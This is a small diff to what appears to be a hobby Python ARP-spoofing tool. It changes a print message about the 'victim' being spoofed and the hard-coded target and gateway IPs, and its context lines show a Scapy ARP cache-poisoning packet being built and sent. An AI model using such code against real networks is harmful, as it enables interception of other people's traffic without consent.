@@ -77,7 +77,7 @@ class Spoofing:
         # Setup ARP cache poisoning packet (op = operation {2 = reply}, pdst = protocol destination {target_ip}, hwdst = hardware source, psrc = protocol source {gateway_ip}).
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         send(packet, verbose=False)
-        print("Skibidi")
+        print("The victim is Skibidi-spoofed.")
         return
 
     def restore(self):
@@ -86,7 +86,7 @@ class Spoofing:
         """
         # Initialize.
         target_ip = self._target_ip
-        spoof_ip  = self._gateway_ip
+        spoof_ip = self._gateway_ip
 
         # Get physical adresses.
         target_mac = self.get_mac(target_ip)
@@ -106,8 +106,8 @@ def main():
     #target_ip = input("VICTIM_IP: ")
     #gateway_ip = input("GATEWAY_IP: ")
 
-    target_ip = '192.168.3.104'
-    gateway_ip = '192.168.3.1'
+    target_ip = '192.168.3.100'
+    gateway_ip = '192.168.3.104'
 
     def ip_setup(target_ip, gateway_ip):
         spoof.set_target_ip(target_ip)
